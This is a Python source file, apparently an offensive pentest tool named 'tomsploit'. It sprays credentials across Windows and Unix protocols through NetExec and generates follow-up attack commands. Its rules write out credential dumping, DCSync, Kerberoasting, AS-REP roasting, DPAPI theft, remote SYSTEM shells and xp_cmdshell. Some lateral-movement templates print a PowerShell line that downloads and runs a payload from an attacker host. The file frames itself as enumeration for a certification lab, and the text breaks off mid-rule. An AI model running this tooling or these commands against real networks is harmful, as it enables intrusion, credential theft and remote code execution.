#!/usr/bin/env python3
"""tomsploit — fast NetExec (nxc) triage across protocols and targets.

Sprays a credential set against every available protocol, confirms which
logins are valid, and prints the exact follow-up commands for each win.

Scope: enumeration only. It finds and reports access (and flags relay-able
hosts, DCs, anonymous access, and creds that are valid-but-unusable), but it
does not exploit, dump, or loot — it generates the commands for you to run.
Think of it as a careful nxc front-end with a context-aware command
generator, not a one-shot credential-attack-and-loot engine.

When a credential works on a domain controller, a read-only enrichment pass
runs a handful of extra LDAP queries (Kerberos delegation, LAPS/gMSA/ADCS,
MachineAccountQuota, a kerberoastable sweep) and turns the results into a
per-account Kerberos-delegation walkthrough written to
tomsploit-delegation-<ip>-<user>.txt: each abusable delegation is laid out
as GET / REQUIRED / MISSING / WHY with a runnable command chain, values
already filled in from the scan. This is still enumeration — every query
reads the directory, nothing is modified. Disable with --no-enrich; the same
delegation engine is available offline via --deleg-in.

Architecture (single file on purpose — easy to scp onto a box mid-exam):

    Config           CLI args -> one settings object
    Models           AuthType, Cred, Success, TargetResult, DelegRow
    Parsing          nxc stdout -> structured data (scan + enrichment queries)
    Suggestions      data-driven table: (auth, proto, dc) -> commands
    Delegation       findDelegation + enrichment -> per-account attack routes
    Reporter         everything that prints to the terminal
    TomSploit        scanning, subprocess control, enrichment, progress
    CLI              parse_args / build_config / main

Every value that reaches the generated file from Active Directory (account
names, SPNs, ACL trustees) is sanitised, and the file is paste-safe: dropped
into a shell it runs only the fully-resolved commands, leaving anything with
an unfilled <placeholder> commented out.
"""
# MIT License — see LICENSE block at end of file.

import argparse
import base64
import ipaddress
import json
import os
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Iterable

# ─── Colors ────────────────────────────────────────────────────────────
RED = GREEN = YELLOW = BLUE = CYAN = BOLD = DIM = RESET = ""
_COLOR_CODES = {
    "RED": "\033[91m", "GREEN": "\033[92m", "YELLOW": "\033[93m",
    "BLUE": "\033[94m", "CYAN": "\033[96m", "BOLD": "\033[1m",
    "DIM": "\033[2m", "RESET": "\033[0m",
}


def configure_colors(no_color: bool) -> None:
    if no_color or not sys.stdout.isatty():
        return
    for name, code in _COLOR_CODES.items():
        globals()[name] = code


# ─── Protocol config ───────────────────────────────────────────────────
ALL_PROTOCOLS = ["smb", "ssh", "ldap", "ftp", "wmi", "winrm", "rdp", "vnc", "mssql", "nfs"]
# Sprayed when --protocols isn't given. VNC and NFS are excluded: nxc's vnc
# module is password-only (it ignores the -u we pass) and its nfs module
# doesn't do credentialed auth at all, so every credential against them
# produced an error line and burned a 45s process slot for nothing. Both are
# still selectable explicitly with --protocols.
DEFAULT_PROTOCOLS = [p for p in ALL_PROTOCOLS if p not in ("vnc", "nfs")]
LOCAL_AUTH_PROTOCOLS = {"smb", "wmi", "winrm", "rdp", "mssql"}

# Default TCP port per protocol for the pre-flight probe.
PROTOCOL_PORTS = {
    "smb": 445, "ssh": 22, "ldap": 389, "ftp": 21, "wmi": 135,
    "winrm": 5985, "rdp": 3389, "vnc": 5900, "mssql": 1433, "nfs": 2049,
}

# Which protocols accept hash / kerberos auth via nxc. (SSH is handled by
# the real ssh client, not nxc — see _scan_ssh — so it's password-only here.)
# Sending a hash to ftp/vnc/nfs makes nxc error, so those creds are skipped.
WINDOWS_PROTOS = {"smb", "winrm", "wmi", "rdp", "mssql", "ldap"}

DEFAULT_WORKERS = 15
NETEXEC_TIMEOUT = 30
SUBPROCESS_TIMEOUT = 45
PORT_PROBE_TIMEOUT = 2.0
MAX_CONSECUTIVE_TIMEOUTS = 3
BANNER_WIDTH = 60
DEFAULT_MAX_CIDR_HOSTS = 1024
# Each attempt is a separate nxc process (~1-2s of interpreter startup before
# a packet moves), so a wordlist turns into hours of pure spawn overhead.
# Refuse past this unless --force; hydra is the right tool for wordlists.
DEFAULT_MAX_ATTEMPTS = 1000


class AuthType(str, Enum):
    PASSWORD = "password"
    HASH = "hash"
    KERBEROS = "kerberos"


# ─── Models ──────────────────────────────────────────────────────────────

@dataclass
class Config:
    """All settings derived from the CLI, shared by the scanner and the
    reporter so neither has to reach back into argparse."""
    targets: list[str]
    users: list[str]
    passwords: list[str]
    hashes: list[str]
    kerberos: bool
    protocols: list[str]
    log_file: str | None
    creds_file: str | None
    json_out: str | None
    workers: int
    quiet: bool
    verbose: bool
    debug: bool
    no_port_probe: bool
    paired: bool = False
    domain: str = ""                        # -d: explicit AD domain for nxc
    force: bool = False                     # bypass the spawn-budget guard
    max_attempts: int = DEFAULT_MAX_ATTEMPTS
    sh_only: bool = False
    no_enrich: bool = False
    deleg_inline: bool = False
    notes: bool = False
    bare: bool = False
    deleg_out: str = ""                   # --sh: paste-ready commands only


@dataclass(frozen=True)
class Cred:
    """One (user, secret, auth_type) tuple to test."""
    user: str
    secret: str
    auth_type: AuthType

    @property
    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS


@dataclass
class Success:
    """A successful nxc [+] auth result. May represent a real cred or a
    Samba guest-mapping pseudo-success (is_guest=True)."""
    protocol: str
    local_auth: bool
    domain: str
    user: str
    secret: str
    auth_type: AuthType
    is_admin: bool = False
    is_guest: bool = False
    raw_message: str = ""

    @property
    def is_hash(self) -> bool: return self.auth_type == AuthType.HASH
    @property
    def is_kerberos(self) -> bool: return self.auth_type == AuthType.KERBEROS
    @property
    def scope(self) -> str: return "local" if self.local_auth else "domain"
    @property
    def label(self) -> str: return f"{self.protocol.upper()} ({self.scope})"

    @property
    def dedup_key(self) -> tuple:
        """Identity used to collapse duplicate [+] lines (nxc sometimes
        prints the same successful auth more than once, especially LDAP)."""
        return (self.protocol, self.local_auth, self.auth_type,
                self.domain.lower(), self.user.lower(), self.secret,
                self.is_guest)


@dataclass
class TargetResult:
    target: str
    # What we actually hand to nxc. Normally == target, but a Kerberos run
    # needs an SPN-resolvable NAME, so this may be rewritten to the host's
    # FQDN (see TomSploit._resolve_kerberos_target).
    nxc_target: str = ""
    # False when --no-port-probe skipped the pre-flight: open_protocols is
    # then an assumption, not evidence, and must not be used as a signal.
    probed: bool = True
    real_ip: str = ""
    hostname: str = ""
    domain: str = ""        # AD domain from nxc info line (e.g. "DANTE.local")
    is_dc: bool = False
    smb_signing: bool | None = None   # None=unknown, True=required, False=relay-able
    elapsed: float = 0.0
    open_protocols: list[str] = field(default_factory=list)
    closed_protocols: list[str] = field(default_factory=list)
    successes: list[Success] = field(default_factory=list)   # real creds
    guests: list[Success] = field(default_factory=list)      # guest mappings
    anon_smb: bool = False
    anon_smb_lines: list[str] = field(default_factory=list)
    anon_ldap: bool = False
    anon_ldap_lines: list[str] = field(default_factory=list)
    anon_ldap_users: list[dict] = field(default_factory=list)  # [{user, description}, ...]
    protocol_lines: dict[str, list[tuple[str, str]]] = field(default_factory=dict)
    target_info: str = ""
    scanned: bool = True
    skipped_reason: str = ""
    # Pre-spray account-lockout read (anonymous nxc --pass-pol):
    lockout_threshold: int | None = None   # None=unknown, 0=disabled, N=threshold
    lockout_window: str = ""               # e.g. "30 minutes" (reset window)
    lockout_checked: bool = False
    # Post-scan LDAP enrichment (see TomSploit._enrich_dc). Populated only for
    # a DC where an LDAP credential worked. These turn always-on suggestion
    # blocks into ones gated on what the domain actually has.
    enriched: bool = False
    deleg_rows: list = field(default_factory=list)      # list[DelegRow]
    laps_hits: list[str] = field(default_factory=list)
    maq: int | None = None                       # ms-DS-MachineAccountQuota
    roastable_sweep: list[str] = field(default_factory=list)   # domain-wide SPNs
    gmsa_hits: list[str] = field(default_factory=list)
    adcs_hits: list[str] = field(default_factory=list)
    enrich_notes: list[str] = field(default_factory=list)


def tasks_per_target(cfg: Config) -> int:
    """(protocol, scope) pairs scheduled per target, worst case.

    Single source of truth: the banner and the spawn-budget guard both need
    this, and when they each computed it inline they drifted — the banner
    forgot the kerberos exclusion and over-reported by 5 tasks/target under
    -k, advertising attempts that are never scheduled."""
    n = len(cfg.protocols)
    if not cfg.kerberos:
        # local-auth scope is only scheduled when not using a ticket cache
        n += sum(1 for p in cfg.protocols if p in LOCAL_AUTH_PROTOCOLS)
    return n


def success_sort_key(s: Success) -> tuple[int, int]:
    """Canonical protocol order, then domain before local. Used wherever
    successes are displayed so output is stable across runs."""
    try:
        return (ALL_PROTOCOLS.index(s.protocol), int(s.local_auth))
    except ValueError:
        return (len(ALL_PROTOCOLS), int(s.local_auth))


# ─── nxc output parsing ────────────────────────────────────────────────

def parse_nxc_line(line: str) -> tuple[str | None, str]:
    """Find the first nxc marker on a line; return (marker, message)."""
    for marker in ("[+]", "[-]", "[*]", "[!]"):
        idx = line.find(marker)
        if idx != -1:
            return marker, line[idx + 4:].strip()
    return None, line.strip()


def _split_principal(head: str) -> tuple[str, str]:
    """Split a `DOMAIN\\user` / `user@REALM` / `user` head into (domain, user)."""
    head = head.strip()
    if "\\" in head:
        domain, user = head.split("\\", 1)
        return domain.strip(), user.strip()
    if "@" in head:
        # user@REALM — the realm is Kerberos's, not a Windows domain prefix,
        # but it identifies the same principal.
        user, realm = head.split("@", 1)
        return realm.strip(), user.strip()
    return "", head


def _principal_matches(head: str, user: str) -> bool:
    """True if an nxc success head names the account we actually tried."""
    _dom, name = _split_principal(head)
    want = (user or "").strip()
    if "\\" in want:
        want = want.split("\\", 1)[1]
    want = want.split("@", 1)[0]
    return bool(name) and bool(want) and name.lower() == want.lower()


def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
    """Parse an nxc [+] message into (domain, user, secret, is_admin, is_guest).

    Examples this handles:
        WORKGROUP\\admin:Password123                -> ('WORKGROUP','admin','Password123',False,False)
        DANTE.local\\katwamba:Diablo5679 (Pwn3d!)   -> (...,True,False)
        DANTE-NIX02\\admin:admin (Guest)            -> (...,False,True)
        WORKGROUP\\j:aad3b...:31d6cfe0... (Pwn3d!)   -> (...,True,False)
        admin:Password123                           -> ('','admin','Password123',False,False)

    Secretless (Kerberos / ticket-cache) successes carry no `:secret` at all:
        DANTE.local\\katwamba from ccache (Pwn3d!)  -> (...,'',True,False)
        DANTE.local\\katwamba                       -> (...,'',False,False)
    Those used to fall into a branch that returned the ENTIRE remaining
    string as the username ("katwamba from ccache"), so parse the leading
    principal token instead.
    """
    cleaned = msg.strip()
    is_admin = False
    is_guest = False

    # Strip a trailing parenthesised flag like (Pwn3d!), (adm), (Guest).
    m = re.search(r"\s*\(([^()]*)\)\s*$", cleaned)
    if m:
        flag = m.group(1).lower()
        if "guest" in flag:
            is_guest = True
        elif "pwn3d" in flag or "adm" in flag:
            is_admin = True
        cleaned = cleaned[:m.start()].rstrip()

    if not cleaned:
        return "", "", "", is_admin, is_guest

    if ":" not in cleaned:
        # Secretless success — only the leading token is the principal;
        # anything after it ("from ccache") is prose.
        domain, user = _split_principal(cleaned.split()[0])
        return domain, user, "", is_admin, is_guest

    head, secret = cleaned.split(":", 1)
    domain, user = _split_principal(head)
    return domain, user, secret, is_admin, is_guest


def is_auth_success(msg: str, user: str, allow_secretless: bool = False) -> bool:
    """True only if a [+] line really is a credential success for `user`.

    nxc's password/hash auth-success format is `DOMAIN\\user:secret [ (flag) ]`.
    Modules and status messages also use [+] (e.g. "[+] Dumped 5 objects");
    without this guard those would be mis-parsed into bogus Success objects.

    `allow_secretless` relaxes the colon requirement and is set ONLY for
    Kerberos attempts, where the ticket cache is the credential and nxc
    prints `DOMAIN\\user [from ccache]` with no secret to match on. Keeping
    it opt-in means an ordinary module line like "[+] Dumped 5 objects" still
    can't sneak through on a password run."""
    cleaned = re.sub(r"\s*\([^()]*\)\s*$", "", msg.strip())
    if ":" in cleaned:
        return _principal_matches(cleaned.split(":", 1)[0], user)
    if not allow_secretless:
        return False
    parts = cleaned.split()
    return bool(parts) and _principal_matches(parts[0], user)


# Markers that an nxc [+] line is auth-related even when it doesn't parse as
# a clean success — used to decide whether to flag a line for manual review.
_PRIV_FLAG_RE = re.compile(r"\(\s*(pwn3d!?|adm(in)?)\s*\)", re.IGNORECASE)
_INFO_PLUS_RE = re.compile(
    # Common benign [+] module/status phrasings — NOT auth, don't flag these.
    r"\b(dumped|enumerat|found|saved|written|wrote|retrieved|obtained|"
    r"collected|added|created|deleted|executed|got \d|\d+ (object|user|"
    r"share|record|file|entry|entries|hash))",
    re.IGNORECASE)


def looks_like_possible_success(msg: str, user: str) -> bool:
    """True if a [+] line that FAILED the strict is_auth_success check still
    looks like it might be a real credential success we mis-parsed — so the
    reporter can flag it 'verify manually' rather than discard it.

    Conservative: only flags lines that either carry an explicit privilege
    marker like (Pwn3d!)/(adm), or contain the username next to a colon
    (credential-shaped) while clearly not matching a known benign module
    phrasing. Everything else is treated as ordinary informational output."""
    text = msg.strip()
    if not text:
        return False
    # Explicit privilege flags only ever appear on auth lines.
    if _PRIV_FLAG_RE.search(text):
        return True
    # Looks credential-shaped (has a colon) and mentions our username, but
    # didn't parse cleanly, and isn't an obvious module/status line.
    if ":" in text and user and user.lower() in text.lower():
        if not _INFO_PLUS_RE.search(text):
            return True
    return False


def extract_ipv4(text: str) -> str | None:
    m = re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
    return m.group(0) if m else None


# Classify a [-] failure line so the report can hide the boring ones (wrong
# password) while always surfacing the meaningful ones. nxc emits all of
# these with a [-] marker, so without this they'd all look alike.
_ORDINARY_FAIL_RE = re.compile(
    r"STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|"
    # Kerberos equivalents of "wrong password" / "no such user". Without
    # these every failed -k attempt fell through to 'error' and printed in
    # red, so a routine Kerberos spray looked like the tool was broken.
    r"KDC_ERR_PREAUTH_FAILED|KDC_ERR_C_PRINCIPAL_UNKNOWN|"
    r"KDC_ERR_PRINCIPAL_NOT_FOUND|"
    # The service answered but won't do this auth for this account — noise,
    # not a fault (e.g. RDP without NLA, a protocol that won't take a hash).
    r"STATUS_NOT_SUPPORTED|STATUS_PIPE_NOT_AVAILABLE|"
    r"authentication failed|login failed|invalid credentials",
    re.IGNORECASE)
_VALID_BUT_RE = re.compile(  # creds are actually CORRECT, with a caveat
    r"STATUS_PASSWORD_EXPIRED|STATUS_PASSWORD_MUST_CHANGE|"
    r"STATUS_PASSWORD_CHANGE_REQUIRED|KDC_ERR_KEY_EXPIRED",
    re.IGNORECASE)
_ALERT_FAIL_RE = re.compile(  # stop-and-look failures
    r"STATUS_ACCOUNT_LOCKED_OUT|STATUS_ACCOUNT_DISABLED|"
    r"STATUS_ACCOUNT_RESTRICTION|STATUS_LOGON_TYPE_NOT_GRANTED|"
    r"STATUS_NOLOGON|STATUS_INVALID_LOGON_HOURS|"
    # Kerberos: account disabled, locked, or expired — same tactic change.
    r"KDC_ERR_CLIENT_REVOKED|KDC_ERR_CLIENT_EXPIRED",
    re.IGNORECASE)


def classify_failure(msg: str) -> str:
    """Bucket a [-] message:
        'valid_but' — credential works but can't be used as-is (expired etc.)
        'alert'     — lockout / disabled / logon-not-permitted: change tactics
        'ordinary'  — plain wrong password: the screen-clogging noise
        'error'     — doesn't look like an auth response at all (conn refused,
                      executable-not-found, protocol/python error): always show
    Unknown lines fall through to 'error' deliberately — better to show an
    odd line once than to silently swallow a real problem."""
    if _VALID_BUT_RE.search(msg):
        return "valid_but"
    if _ALERT_FAIL_RE.search(msg):
        return "alert"
    if _ORDINARY_FAIL_RE.search(msg):
        return "ordinary"
    return "error"


def _dc_name_hint(target_info: str) -> bool:
    """Weak signal: does the hostname look like a DC? Used only as a
    tiebreaker — many real DCs are not named conventionally, and names like
    DEVDC / DCLIENT false-positive, so this never decides on its own."""
    if not target_info:
        return False
    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
    if not m:
        return False
    hostname = m.group(1).lower()
    # Require the "dc" token to be its own word or a numbered DC (DC, DC01,
    # PDC, ADDC) — not merely a prefix, so DCLIENT / DEVDC don't match.
    return bool(re.search(r"(^|[^a-z])(p?dc|addc)\d*([^a-z]|$)", hostname))


def detect_dc(target_info: str, ldap_open: bool, ldap_info: str = "",
              role_flag: bool = False, domain_hint: str = "") -> bool:
    """Signal-based DC detection, strongest signal first:

      1. nxc explicitly flags the DC role in its output  -> definite.
      2. LDAP service is reachable AND an AD domain is present -> a DC.
         Member servers and workstations don't answer LDAP on 389/636;
         only Domain Controllers do, so a working LDAP bind plus a real
         (non-WORKGROUP) domain is the reliable tell.
      3. Otherwise fall back to the hostname hint (tiebreaker only).

    `ldap_info` is nxc's LDAP [*] line if we got one (its mere existence is
    strong evidence LDAP answered). `role_flag` is set if any nxc line
    contained an explicit DC role marker."""
    if role_flag:
        return True

    domain = (extract_domain(target_info) or extract_domain(ldap_info)
              or (domain_hint or ""))
    has_ad_domain = bool(domain) and domain.upper() != "WORKGROUP"

    # LDAP answered (port open, or we actually got an LDAP info line back).
    ldap_answered = ldap_open or bool(ldap_info)
    if ldap_answered and has_ad_domain:
        return True

    # Weak fallback: conventional DC name. Require an AD domain too, so a
    # stray "dc" in a workgroup machine's name doesn't trip it.
    if has_ad_domain and _dc_name_hint(target_info):
        return True
    return False


# nxc occasionally tags the DC role explicitly in its banner/info output;
# match the common spellings without over-fitting.
_DC_ROLE_RE = re.compile(
    r"\b(domain controller|\(DC\)|is a? ?dc\b|primary domain controller)\b",
    re.IGNORECASE)


def line_flags_dc_role(msg: str) -> bool:
    return bool(_DC_ROLE_RE.search(msg))


def extract_hostname(target_info: str) -> str:
    m = re.search(r"name:([^\s)]+)", target_info, re.IGNORECASE)
    return m.group(1).upper() if m else ""


def extract_domain(target_info: str) -> str:
    """Pull the AD domain from nxc's [*] info line (e.g. 'domain:DANTE.local')."""
    m = re.search(r"domain:([^\s)]+)", target_info, re.IGNORECASE)
    return m.group(1) if m else ""


def extract_ldap_attr(line: str, attr: str) -> str | None:
    """Pull `attr: value` out of an nxc LDAP output line.

    Anchored on the attribute name rather than split(':', 1), because the
    line carries an nxc prefix that can itself contain a colon (an IPv6
    target, a timestamped format) - splitting on the first colon then
    returns the wrong half."""
    m = re.search(rf"(?:^|[\s\[])({re.escape(attr)})\s*:\s*(.*)$", line,
                  re.IGNORECASE)
    return m.group(2).strip() if m else None


def extract_smb_signing(target_info: str) -> bool | None:
    """Read SMB signing state from nxc's SMB info line '(signing:True/False)'.
    Returns True (required), False (not required → relay-able), or None
    (not present in the line we parsed)."""
    m = re.search(r"signing:\s*(True|False)", target_info, re.IGNORECASE)
    if not m:
        return None
    return m.group(1).lower() == "true"


# ─── Suggestion engine ─────────────────────────────────────────────────
# A success becomes a list of (label, command) follow-ups by matching it
# against SUGGEST_RULES. Every value substituted into a template passes
# through shlex.quote() first, so secrets with spaces/quotes/$ paste safely.
#
# Rationale for what is / isn't suggested (OSEP / PEN-300 oriented):
#   * The tool's job ends at "valid credential + the next command"; it is an
#     enumeration and credential-triage aid, NOT an exploitation framework.
#     Payload generation, AV/AMSI/AppLocker bypass and process injection are
#     deliberately out of scope (that is TomCrypt's job) — so what you get
#     here is the AD legwork that surrounds those, not the delivery itself.
#   * One share enumerator (nxc --shares already shows r/w perms) to avoid
#     the smbmap-vs-nxc duplication.
#   * `--rid-brute` is offered everywhere it works — it pulls users over
#     SMB even when LDAP is closed, which is common on member servers.
#   * AD enumeration lives in the LDAP block; secretsdump lives in the SMB
#     block — so a host where both succeed doesn't print either twice.
#   * BloodHound has a fallback (nxc's own collector + ldapdomaindump +
#     individual nxc attack-path flags) for when bloodhound-python chokes
#     on DNS/clock skew, which it frequently does in labs.

def q(v: str | None) -> str:
    """shlex.quote with sane handling of None/empty."""
    if v is None or v == "":
        return "''"
    return shlex.quote(str(v))


@dataclass(frozen=True)
class SuggestRule:
    """commands is a tuple of (label, template). A template is a PLAIN
    string (never an f-string) using {placeholders} filled from the context
    built in build_context(); it may contain newlines for multi-line notes.
    dc: None = any host, True = DC only, False = non-DC only."""
    auth: AuthType
    proto: str
    commands: tuple[tuple[str, str], ...]
    dc: bool | None = None
    # admin: None = any, True = only when nxc flagged (Pwn3d!), False = only
    # when it didn't. Note nxc decides Pwn3d! for SMB by testing ADMIN$ access,
    # so admin=False is not "low privilege" — it is "we could not confirm admin
    # via ADMIN$", which includes admins whose ADMIN$ is blocked.
    admin: bool | None = None


SUGGEST_RULES: list[SuggestRule] = [

    # ── PASSWORD · SMB ──────────────────────────────────────────────
    SuggestRule(AuthType.PASSWORD, "smb", dc=False, commands=(
        ("list shares + perms",
            "nxc smb {qip} -u {quser} -p {qpw} --shares"),
        ("spider shares + download readable files",
            "nxc smb {qip} -u {quser} -p {qpw} -M spider_plus -o DOWNLOAD_FLAG=true\n"
            "# inventory + loot saved under ~/.nxc/modules/nxc_spider_plus/<ip>.json"),
        ("interactive share browse",
            "smbclient //{ip}/<SHARE> -U {smb_user}"),
        ("enumerate users via SAMR (RID brute)",
            "nxc smb {qip} -u {quser} -p {qpw} --rid-brute"),
        ("full SMB/RPC enum",
            "enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
        ("dump SAM + LSA + cached creds (needs local admin)",
            "impacket-secretsdump {url_pw}"),
        ("DPAPI secrets — browser creds, WiFi keys, saved RDP/creds (local admin)",
            "nxc smb {qip} -u {quser} -p {qpw} --dpapi\n"
            "# add 'cookies' to also pull browser cookies; nxc decrypts with the\n"
            "# machine masterkey it grabs as SYSTEM. Often the fastest win on a\n"
            "# workstation — saved creds a user typed into RDP / a browser."),
        ("SYSTEM shell (needs local admin)",
            "impacket-psexec {url_pw}"),
        ("exec fallbacks (if psexec fails)",
            "impacket-wmiexec {url_pw}\nimpacket-smbexec {url_pw}"),
    )),
    SuggestRule(AuthType.PASSWORD, "smb", dc=True, commands=(
        ("list shares + perms",
            "nxc smb {qip} -u {quser} -p {qpw} --shares"),
        ("enumerate users via SAMR (RID brute)",
            "nxc smb {qip} -u {quser} -p {qpw} --rid-brute"),
        ("password policy (avoid lockout)",
            "nxc smb {qip} -u {quser} -p {qpw} --pass-pol"),
        ("GPP cpasswords in SYSVOL",
            "nxc smb {qip} -u {quser} -p {qpw} -M gpp_password"),
        ("DCSync the domain",
            "impacket-secretsdump -just-dc {url_pw}\n"
            "# on-target alt:  mimikatz \"lsadump::dcsync /domain:{dom_plain} /user:krbtgt\""),
        ("browse SYSVOL / scripts",
            "smbclient //{ip}/SYSVOL -U {smb_user}"),
    )),

    # ── PASSWORD · LDAP ─────────────────────────────────────────────
    SuggestRule(AuthType.PASSWORD, "ldap", dc=True, commands=(
        ("clock skew — do this FIRST, it breaks every Kerberos step below",
            "sudo ntpdate {ip} 2>/dev/null || sudo rdate -n {ip}\n"
            "# KRB_AP_ERR_SKEW is the #1 cause of 'my ticket doesn't work'.\n"
            "# If you can't change system time:  faketime \"$(date -d @$(( $(date +%s) )) )\" <cmd>"),
        ("Kerberoast — SPN tickets (from Kali)",
            "impacket-GetUserSPNs -request -dc-ip {qip} "
            "{qdom}/{quser}:{qpw} -outputfile kerb.hash\n"
            "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
        ("Kerberoast — on the target if impacket fails (Rubeus)",
            "# upload first:  iwr http://$LHOST/Rubeus.exe -o Rubeus.exe   ($LHOST = your VPN IP)\n"
            "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash"),
        ("AS-REP roast — preauth-disabled users (from Kali)",
            "impacket-GetNPUsers {qdom}/{quser}:{qpw} -request "
            "-format hashcat -outputfile asrep.hash -dc-ip {qip}\n"
            "# crack:  hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"),
        ("AS-REP roast — on the target (Rubeus)",
            "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
        ("BloodHound (primary collector)",
            "bloodhound-python -u {quser} -p {qpw} -d {qdom} "
            "-dc {fqdn} -ns {qip} -c All --zip"),
        ("BloodHound fallback (nxc collector)",
            "nxc ldap {qip} -u {quser} -p {qpw} --bloodhound -c All "
            "--dns-server {qip}"),
        ("attack-path checks",
            "nxc ldap {qip} -u {quser} -p {qpw} --password-not-required\n"
            "nxc ldap {qip} -u {quser} -p {qpw} --admin-count\n"
            "# (delegation runs automatically; --no-enrich to skip)"),
        ("offline AD dump (no BloodHound)",
            "ldapdomaindump -u {ldap_user} -p {qpw} {qip}"),
        ("enumerate more usernames (kerbrute)",
            "kerbrute userenum --dc {qip} -d {qdom} "
            "/usr/share/seclists/Usernames/Names/names.txt"),
    )),
    SuggestRule(AuthType.PASSWORD, "ldap", dc=False, commands=(
        ("offline directory dump",
            "ldapdomaindump -u {ldap_user} -p {qpw} {qip}"),
    )),

    # ── PASSWORD · other Windows protocols ──────────────────────────
    SuggestRule(AuthType.PASSWORD, "winrm", commands=(
        ("interactive shell",
            "evil-winrm -i {qip} -u {quser} -p {qpw}"),
        ("confirm exec without a full shell",
            "nxc winrm {qip} -u {quser} -p {qpw} -x whoami"),
    )),
    SuggestRule(AuthType.PASSWORD, "wmi", commands=(
        ("semi-interactive shell",
            "impacket-wmiexec {url_pw}"),
        ("quick command exec",
            "nxc wmi {qip} -u {quser} -p {qpw} -x whoami"),
    )),
    SuggestRule(AuthType.PASSWORD, "rdp", commands=(
        ("RDP session (+ share mount for transfers)",
            "{rdp_bin} /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
            "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
        ("screenshot the desktop",
            "nxc rdp {qip} -u {quser} -p {qpw} --screenshot"),
    )),
    SuggestRule(AuthType.PASSWORD, "mssql", commands=(
        ("SQL client",
            "impacket-mssqlclient {url_pw} {mssql_authflag}"),
        ("xp_cmdshell (in the mssqlclient prompt)",
            "enable_xp_cmdshell;\nxp_cmdshell whoami;"),
        ("OS command via nxc",
            "nxc mssql {qip} -u {quser} -p {qpw} -x whoami"),
        ("capture NetNTLM via xp_dirtree (start responder first)",
            "EXEC master..xp_dirtree '\\\\$LHOST\\share';"),
    )),

    # ── PASSWORD · *nix protocols ───────────────────────────────────
    SuggestRule(AuthType.PASSWORD, "ssh", commands=(
        ("shell (no host-key prompts)",
            "ssh -o UserKnownHostsFile=/dev/null "
            "-o StrictHostKeyChecking=no {user_ssh}"),
        ("after login — quick local enum",
            "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null"),
    )),
    SuggestRule(AuthType.KERBEROS, "ssh", commands=(
        ("shell via the ticket cache (GSSAPI)",
            "ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=no "
            "-o PreferredAuthentications=gssapi-with-mic {quser}@{ip}\n"
            "# NOT delegating your TGT (no -K): a delegated ticket is "
            "harvestable on the target.\n"
            "# add -K only if you deliberately need onward Kerberos auth FROM "
            "that host."),
        ("after login — quick local enum",
            "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null"),
    )),
    SuggestRule(AuthType.PASSWORD, "ftp", commands=(
        ("log in with the found creds",
            "ftp ftp://{user_at_host}\n"
            "# or interactively:  ftp {qip}   (then enter {quser} / the password)"),
        ("recursive pull",
            "wget -r {ftp_url}"),
    )),
    SuggestRule(AuthType.PASSWORD, "vnc", commands=(
        ("connect",
            "vncviewer {qip}"),
    )),
    SuggestRule(AuthType.PASSWORD, "nfs", commands=(
        ("list exports",
            "showmount -e {qip}"),
        ("mount an export",
            "sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o nolock,vers=3 "
            "{ip}:<EXPORT> /mnt/nfs"),

    )),

    # ── SCShell — admin-gated, DC or not ────────────────────────────
    # Separated out because SCShell needs no SMB FILE access: it reconfigures
    # an existing service's binPath over MS-SCMR rather than writing a service
    # binary, so it works where psexec/smbexec die on a blocked or missing
    # ADMIN$. It is not SMB-free — the usual scshell.py transport is
    # ncacn_np:\pipe\svcctl, so 445 must still be reachable. That is why
    # these rules stay keyed on an SMB success rather than on 135/DCERPC.
    #
    # Gated on admin=True. Note nxc decides (Pwn3d!) by testing ADMIN$, so a
    # real admin on a host with ADMIN$ locked down comes back UNflagged and
    # won't see this — that caveat is noted inside the recipe itself rather
    # than fired as a separate suggestion on every unflagged host.
    SuggestRule(AuthType.PASSWORD, "smb", admin=True, commands=(
        ("lateral movement via SCShell — use when psexec/smbexec fail",
            "python3 scshell.py {url_pw} -service-name ssh-agent\n"
            "# if ssh-agent is absent, confirm a present service first:\n"
            "sc.exe query state= all | findstr SERVICE_NAME   # (in any shell you land)\n"
            "# swap -service-name to one of: defragsvc seclogon SensorDataService SessionEnv\n"

            "# SCShell> full-path command, e.g.:\n"
            "#   C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "#     -ep bypass iex(New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1')"),
    )),
    SuggestRule(AuthType.HASH, "smb", admin=True, commands=(
        ("lateral movement via SCShell [PtH] — use when psexec/smbexec fail",
            "python3 scshell.py {url_nopw} -hashes :{nthash} -service-name ssh-agent\n"
            "# if ssh-agent is absent, confirm a present service first:\n"
            "sc.exe query state= all | findstr SERVICE_NAME   # (in any shell you land)\n"
            "# swap -service-name to one of: defragsvc seclogon SensorDataService SessionEnv\n"

            "# SCShell> full-path command, e.g.:\n"
            "#   C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "#     -ep bypass iex(New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1')"),
    )),
    SuggestRule(AuthType.KERBEROS, "smb", admin=True, commands=(
        ("lateral movement via SCShell -k — use when psexec fails",
            "python3 scshell.py -k -no-pass {url_nopw} -service-name ssh-agent\n"
            "# if ssh-agent is absent, confirm a present service first:\n"
            "sc.exe query state= all | findstr SERVICE_NAME\n"
